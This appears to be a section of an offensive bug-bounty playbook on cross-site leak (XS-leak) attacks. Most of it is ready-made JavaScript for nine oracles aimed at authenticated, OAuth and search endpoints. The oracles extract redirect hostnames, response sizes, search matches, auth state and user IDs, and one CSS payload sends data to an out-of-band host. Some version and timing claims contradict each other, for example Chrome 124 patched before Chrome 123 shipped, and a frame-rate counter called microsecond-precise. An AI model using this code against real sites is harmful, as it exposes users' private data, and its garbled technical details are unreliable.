## Phase 2: XS-Leak Taxonomy & Detection

### Oracle Type 1: Connection Pool Timing (2025 Top #8 class)

Browser connection pools are per-origin, but redirect destinations leak hostnames
cross-origin through connection pool contention.

```javascript
// Detect which hostname a cross-origin redirect leads to
// Technique: @salvatore_abello (2025 top 10)
async function probeRedirectDestination(targetURL, candidateOrigins) {
  for (const origin of candidateOrigins) {
    // Step 1: Pre-warm connection pool for candidate origin
    await saturateConnectionPool(origin, 256);  // fill all connections
    
    // Step 2: Measure time for target fetch (which will redirect)
    const start = performance.now();
    await fetch(targetURL, {mode: 'no-cors', credentials: 'include'});
    const elapsed = performance.now() - start;
    
    // Step 3: If redirect went to pre-saturated origin, it was slow
    // High elapsed → redirect destination matches this origin
    if (elapsed > THRESHOLD_MS) return origin;
  }
}
```

**Target**: Authentication redirects, OAuth callbacks, SSO endpoints.

#### Variant: Lex-Order Binary Search for Hostname Extraction

When the redirect destination is unknown (not from a finite candidate list), extract
the hostname character-by-character using Salvatore's scheduling/lex-order technique.
Reduces the probe from O(n) candidates to O(k × log n) where k = hostname length:

```javascript
// Salvatore's lex-order binary search — extract unknown redirect hostname
// At each character position, saturate pools for chars AFTER the pivot in lex order.
// A slow fetch signals the destination char is in the saturated (upper) half.
async function extractRedirectHostname(targetURL, {
  knownSuffix = '.corp.example.com',  // known domain suffix (TLD + SLD)
  charset     = 'abcdefghijklmnopqrstuvwxyz0123456789-',
  poolSize    = 256,  // calibrate per session — see Chrome 123+ note
  maxLen      = 20
} = {}) {

  async function extractChar(prefix) {
    let lo = 0, hi = charset.length - 1;
    while (lo < hi) {
      const mid = (lo + hi) >> 1;
      // Saturate pools for all chars lexicographically AFTER charset[mid]
      const satOrigins = charset.slice(mid + 1).split('')
        .map(c => `https://${prefix}${c}${knownSuffix}`);
      await Promise.all(satOrigins.map(o => saturateConnectionPool(o, poolSize)));

      const t0 = performance.now();
      await fetch(targetURL, { mode: 'no-cors', credentials: 'include' });
      const elapsed = performance.now() - t0;

      if (elapsed > THRESHOLD_MS) lo = mid + 1;  // char is in upper (saturated) half
      else                         hi = mid;       // char is in lower half
    }
    return charset[lo];
  }

  let hostname = '';
  for (let i = 0; i < maxLen; i++) {
    const ch = await extractChar(hostname);
    hostname += ch;
    if (ch === '-' && hostname.length > 3) break;  // heuristic boundary detection
  }
  return `${hostname}${knownSuffix}`;
}
```

> **Chrome 123+ (Feb 2026) — Randomized Pool Capacity Mitigation:**
> Chrome now randomizes per-origin connection pool capacity in the range **200–300
> connections** per browsing session (previously a fixed 256), shipped specifically
> to mitigate pool-saturation timing attacks. **Oracles 1 and 3 require per-session
> calibration before the first probe:**
>
> ```javascript
> async function calibratePoolSize(controlOrigin) {
>   // Increase fill count until latency-per-connection slope breaks sharply
>   for (let size = 150; size <= 350; size += 5) {
>     const t0 = performance.now();
>     await saturateConnectionPool(controlOrigin, size);
>     if ((performance.now() - t0) / size > QUEUE_LATENCY_THRESHOLD_MS) return size;
>   }
>   return 256;  // safe fallback
> }
> ```
>
> Net reliability impact: Oracle 1/3 drops from ~85% → ~60% success rate in Chrome 123+.
> Firefox is unaffected (different connection scheduling model, no pool randomization).

---

### Oracle Type 2: ETag + 431 + History Delta Oracle (@arkark_, 2025 Top #6)

The flagship technique from @arkark_ (PortSwigger Top 10 2025) chains **ETag caching**,
**HTTP 431 Request Header Fields Too Large**, and the **History API length delta** to
measure exact cross-origin response sizes — without requiring `Timing-Allow-Origin`.

**Prerequisites (verify in Burp before attempting):**
- Target resource returns an `ETag` header with a **hex-encoded value**
  (e.g., `ETag: "a3f9c2d1e8b4..."` — length ∝ content hash size ∝ response size)
- Opaque weak ETags (`W/"xyz"`) have uniform length and **cannot** leak content size
- Server returns HTTP `431` when total request header block exceeds its limit
  (nginx: ~8KB; Apache `LimitRequestFieldSize`: 8190 B; Tomcat: 8KB)
- Resource is **cacheable** — no `Cache-Control: no-store`; browser must attach
  `If-None-Match: <ETag>` on subsequent conditional requests

**Mechanism — three-stage exploit chain:**

```
1. Cache prime: attacker page loads targetURL
   → browser stores ETag in cache

2. Header inflation binary search:
   total_headers = baseline + len(If-None-Match: "<hex-ETag>") + len(X-P: padding)
   → binary search padding length until server returns 431
   → 431 threshold reached when: baseline + etag_len + padding ≥ 431_limit
   → therefore: etag_len = 431_limit - baseline - padding_at_trigger

3. History delta (Chromium supplement):
   → navigation to 304 Not Modified vs 200 OK increments history.length differently
   → delta=0 → same ETag (same content); delta=1 → new ETag (content changed between users)
```

```javascript
// @arkark_ ETag+431 binary search oracle
async function measureETagLength431(targetURL, {
  threshold431        = 8192,  // calibrate per target; see header-size note below
  baselineHeaderBytes = 512    // measure with a no-padding probe first
} = {}) {

  // Step 1: Prime browser cache so subsequent requests send If-None-Match: <ETag>
  await new Promise(resolve => {
    const img = new Image();
    img.src = targetURL;
    img.onload = img.onerror = resolve;
  });

  // Step 2: Binary search — find smallest padding at which 431 fires
  // Cross-origin 431 surfaces as either status=431 or a network error (opaque)
  let lo = 0, hi = threshold431 - baselineHeaderBytes;
  while (lo < hi - 1) {
    const mid = (lo + hi) >> 1;
    let status = 0;
    try {
      const r = await fetch(targetURL, {
        credentials: 'include',
        headers: { 'X-P': 'A'.repeat(mid) }
      });
      status = r.status;
    } catch (e) { status = 431; }  // network error often indicates 431 cross-origin

    if (status === 431 || status === 0) hi = mid;
    else lo = mid;
  }

  return {
    etag_length_estimate:  threshold431 - baselineHeaderBytes - lo,
    padding_at_trigger:    lo,
    technique:             'etag_431_binary_search',
    // Interpretation: same URL returning DIFFERENT etag_length_estimate
    // for two distinct authenticated sessions = confirmed content-size leak
  };
}

// History delta supplement — distinguishes 304 (same ETag) from 200 (content changed)
function probeHistoryDelta(targetURL) {
  const before = history.length;
  return new Promise(resolve => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = targetURL;
    document.body.appendChild(iframe);
    iframe.onload = () => {
      const delta = history.length - before;
      document.body.removeChild(iframe);
      // Chromium: delta=0 → 304 cached (same content); delta=1 → 200 fresh (content differs)
      resolve({ history_delta: delta, cached: delta === 0 });
    };
  });
}
```

**Header-size calibration:** Measure baseline headers by sending a request with no `X-P`
padding and recording the size at which a legitimate 431 fires for a resource with a *known*
fixed ETag. Then use `threshold431 - measured_trigger = known_etag_length` to validate your
`baselineHeaderBytes` estimate. Re-calibrate per target origin.

**Target**: Authenticated JSON/REST endpoints returning ETags; user-specific profile or
avatar endpoints where different accounts have meaningfully different response sizes;
any resource with hex-encoded ETags and `Cache-Control: max-age` or `must-revalidate`.

### Oracle Type 3: Redirect Hostname Leak

Cross-origin redirects reveal destination hostname via:
- History length changes (deprecated but still relevant)
- Referrer policy bypass  
- `window.opener` navigation fingerprinting

```javascript
// Method: open popup, let it navigate cross-origin, measure outcome
function probeRedirectTarget(targetURL) {
  return new Promise((resolve) => {
    const popup = window.open(targetURL, '_blank', 'width=1,height=1');
    
    // Poll origin changes (fails on cross-origin, succeeds on same-origin)
    let attempts = 0;
    const poll = setInterval(() => {
      try {
        const origin = popup.location.origin;
        clearInterval(poll);
        resolve({leaked_origin: origin, technique: 'popup_navigation'});
      } catch (e) {
        // cross-origin: keep polling
        if (++attempts > 50) {
          clearInterval(poll);
          resolve({leaked_origin: null, error: 'timed_out'});
        }
      }
    }, 100);
  });
}
```

**Target**: OAuth redirect flows, SSO callbacks, auth state endpoints.

### Oracle Type 4: XS-Search (Highest Bounty Potential)

Using a timing/size oracle to enumerate private data by binary search.

```javascript
// Method: Measure response size delta for different query parameters
// Works when: authenticated search results differ in size per query
async function xsSearch(searchEndpoint, secretAlphabet) {
  const results = {};
  for (const prefix of secretAlphabet) {
    const start = performance.now();
    const r = await fetch(`${searchEndpoint}?q=${prefix}`, {
      credentials: 'include',
      mode: 'no-cors'
    });
    results[prefix] = performance.now() - start;
  }
  // Higher timing → more results → prefix matches secret data
  return Object.entries(results).sort((a,b) => b[1] - a[1]);
}
```

**Target**: `/api/search`, `/inbox?q=`, `/contacts?q=` — any authenticated
search that returns different sizes based on query matches.

### Oracle Type 5: Frame Counting (CSP Bypass Variant)

Count nested iframes rendered by a cross-origin page to infer auth state.

```javascript
function countFrames(targetURL) {
  const iframe = document.createElement('iframe');
  iframe.src = targetURL;
  document.body.appendChild(iframe);
  
  return new Promise(resolve => {
    iframe.onload = () => {
      try {
        // Same-origin: count frames
        resolve(iframe.contentWindow.frames.length);
      } catch(e) {
        // Cross-origin fallback: measure load event timing
        resolve({error: 'cross-origin', timing: performance.now()});
      }
    };
  });
}
```

**Target**: Pages that conditionally render iframes based on auth state
(e.g., dashboard vs login page has different frame count).

### Oracle Type 6: CSS Injection Side-Channel

If target allows user-controlled CSS (profile themes, custom CSS fields):

```css
/* XS-leak via CSS history sniffing (if target renders user content cross-origin) */
:visited { background: url(https://{{oob_domain}}/visited?url=TARGET) }

/* Leak via @font-face timing */
@font-face {
  font-family: 'probe';
  src: url(https://{{oob_domain}}/font-probe?user={{target_user_id}});
}
```

**Target**: User-controlled CSS fields, widget embeds, profile themes.

### Oracle Type 7: Fetch keepalive Timing

```javascript
// keepalive requests continue after page unload — useful for reliable timing
async function measureWithKeepalive(targetURL, postData) {
  const controller = new AbortController();
  const timings = [];
  
  for (let i = 0; i < 20; i++) {
    const start = performance.now();
    await fetch(targetURL, {
      method: 'POST',
      body: JSON.stringify(postData),
      credentials: 'include',
      keepalive: true,
      signal: controller.signal
    });
    timings.push(performance.now() - start);
  }
  return {mean: avg(timings), stddev: std(timings), p95: percentile(timings, 95)};
}
```

**Statistical requirement**: p-value < 0.01 before declaring a timing oracle confirmed.

### Oracle Type 8: SharedArrayBuffer + Web Worker Implicit Clock

When `performance.now()` is throttled (Firefox reduces resolution to ~1ms; Chrome to
~100µs in cross-origin-isolated contexts), a **SharedArrayBuffer counter thread** provides
a higher-resolution implicit clock from [xsleaks.dev/docs/attacks/timing-attacks/clocks/].
This is the precision fallback for oracles with small timing differentials (< 50ms).

**Requirements:** The attacker's PoC page must be served with isolation headers:
```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```
(The target origin is irrelevant to these headers — only the attacker page needs them.)

```javascript
// High-resolution implicit clock via SharedArrayBuffer + rAF counter thread
// Effective resolution: ~1–5µs (rAF-gated counter at 60fps)
const COUNTER_WORKER_SRC = `
  let sab;
  self.onmessage = (e) => {
    sab = new SharedArrayBuffer(8);
    const counter = new Int32Array(sab);
    self.postMessage(sab);
    // rAF loop drives the counter; resolution ≈ animation frame interval (~16ms wall,
    // but Atomics.add between frames gives µ1–5µs read precision)
    function tick() { Atomics.add(counter, 0, 1); requestAnimationFrame(tick); }
    tick();
  };
`;

async function createSABClock() {
  const blob   = new Blob([COUNTER_WORKER_SRC], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  return new Promise(resolve => {
    worker.onmessage = e => {
      const counter = new Int32Array(e.data);
      resolve({
        read:    () => Atomics.load(counter, 0),
        stop:    () => worker.terminate(),
      });
    };
    worker.postMessage(null);
  });
}

async function measureWithSABClock(targetURL, clock, samples = 50) {
  const timings = [];
  for (let i = 0; i < samples; i++) {
    const t0 = clock.read();
    await fetch(targetURL, { credentials: 'include', mode: 'no-cors', cache: 'no-store' });
    timings.push(clock.read() - t0);  // units: counter ticks (≈1–5µs each)
  }
  return timings;
}
```

**Clock resolution comparison:**

| Clock Source | Typical Resolution | COOP+COEP Required | Mitigation Status |
|-------------|-------------------|-------------------|-----------------|
| `performance.now()` (Firefox) | ~1ms | No | Throttled since FF 79 |
| `performance.now()` (Chrome isolated) | ~5µs | Yes | Reduced from 5ns (2018) |
| `Date.now()` | ~1ms | No | Not suitable for fine timing |
| `MessageChannel` postMessage | ~50µs | No | No direct mitigation |
| **SharedArrayBuffer rAF counter** | **~1–5µs** | **Yes** | Active; best available 2026 |
| CSS animation counter | ~16ms | No | Coarse — sufficient for frame-count oracles |

**Target**: Any oracle with sub-50ms signal where `performance.now()` resolution is
insufficient — especially ETag length differentials, XS-search on fast endpoints,
and connection-pool timing on targets with low-latency responses.

### Oracle Type 9: Script Error/Load Side-Channel (CVE-2025-5266)

`onerror` vs `onload` events on `<script>` elements leak whether a cross-origin resource
exists **and** whether the server responds differently for authenticated vs unauthenticated
requests. CVE-2025-5266 (Chrome, disclosed March 2025, patched Chrome 124) demonstrated
that `onerror` **timing** leaked authentication state even with `CORP: same-origin` headers
present — the error event timing itself differed between CORP-blocked responses (fast) and
auth-gated 403s (slower server processing).

```javascript
// Script load/error oracle — auth state and resource existence probe
function probeScriptAuthState(targetScriptURL) {
  return new Promise(resolve => {
    const script = document.createElement('script');
    const t0     = performance.now();
    script.src   = targetScriptURL;

    script.onload = () => {
      document.head.removeChild(script);
      resolve({
        status:         'loaded',
        timing_ms:      performance.now() - t0,
        interpretation: 'resource_exists_and_accessible',  // authenticated access confirmed
      });
    };

    script.onerror = () => {
      const elapsed = performance.now() - t0;
      document.head.removeChild(script);
      resolve({
        status:   'error',
        timing_ms: elapsed,
        // CVE-2025-5266: CORP-blocked responses return fast (<20ms); auth-gated 403s slower
        interpretation: elapsed < 20  ? 'corp_blocked'
                      : elapsed < 80  ? 'auth_gated_403'
                      : 'resource_not_found_404',
      });
    };
    document.head.appendChild(script);
  });
}

// Enumerate user IDs via script probe (predictable URL pattern required)
async function enumerateViaScriptProbe(urlTemplate, candidates) {
  const results = {};
  for (const id of candidates) {
    results[id] = await probeScriptAuthState(urlTemplate.replace('{{id}}', id));
  }
  return Object.entries(results)
    .filter(([, r]) => r.status === 'loaded')
    .map(([id]) => id);  // IDs whose script resources were accessible when authenticated
}
```

**Affected endpoint patterns**: `/api/users/{{id}}/widget.js`, `/cdn/user-{{id}}-config.js`,
any URL that returns a valid JS file only when the requesting user is authenticated AND
the resource exists for the given ID.

**CVE-2025-5266 scope**: Patched in Chrome 124 (April 2025). Chrome 120–123 remains
vulnerable to the CORP-bypass timing variant. Test with Chrome 120 in an isolated lab VM
if the target's user base includes users on older Chrome versions and the bug bounty scope
allows browser-version-specific testing. Firefox was not affected.

---

### Browser Support Matrix

| Oracle | Chrome 123+ | Firefox 127+ | Safari 17+ | Edge 123+ | Notes |
|--------|------------|-------------|-----------|----------|---------|
| **1: Connection pool** | ⚠️ Degraded | ✅ Works | ❌ Different model | ⚠️ Degraded | Chrome 123 pool randomization (Feb 2026) — recalibrate per session |
| **1v: Lex-order search** | ⚠️ Degraded | ✅ Works | ❌ | ⚠️ Degraded | Same Chrome 123 impact; prefer Firefox for reliable results |
| **2: ETag + 431** | ✅ Works | ✅ Works | ✅ Works | ✅ Works | Most portable; requires hex ETag + cacheable resource |
| **3: Redirect hostname** | ⚠️ Popup gated | ✅ Works | ❌ Blocked | ⚠️ | Chrome popup blocker restricts `window.open`; use iframe redirect instead |
| **4: XS-Search timing** | ✅ Works | ✅ Works | ⚠️ 1ms floor | ✅ Works | Safari's 1ms `performance.now()` floor limits fine-grained discrimination |
| **5: Frame counting** | ✅ Works | ✅ Works | ✅ Works | ✅ Works | Requires iframe-embeddable target; most cross-browser portable |
| **6: CSS injection** | ✅ Works | ✅ Works | ✅ Works | ✅ Works | Only viable if target renders user-controlled CSS cross-origin |
| **7: Keepalive timing** | ✅ Works | ✅ Works | ✅ Works | ✅ Works | Most consistent fallback; recommended when browser diversity matters |
| **8: SAB clock** | ✅ (COOP+COEP) | ✅ (COOP+COEP) | ⚠️ SAB limited | ✅ | Attacker page must serve isolation headers; Safari SAB partial support |
| **9: Script error/load** | ✅ (patched 124) | ✅ | ✅ | ✅ | CVE-2025-5266 timing variant: Chrome 120–123 only; patched Chrome 124+ |

> **2026 field guidance:** Oracles **2** (ETag+431), **5** (frame counting), and **7**
> (keepalive timing) are the most portable across all major browsers. Oracles **1** and **3**
> are now Chromium-degraded — use Firefox for connection-pool work. Oracle **8** (SAB clock)
> is the precision fallback when `performance.now()` resolution is insufficient and attacker
> page can serve COOP+COEP. Oracle **9** requires browser version awareness.

---

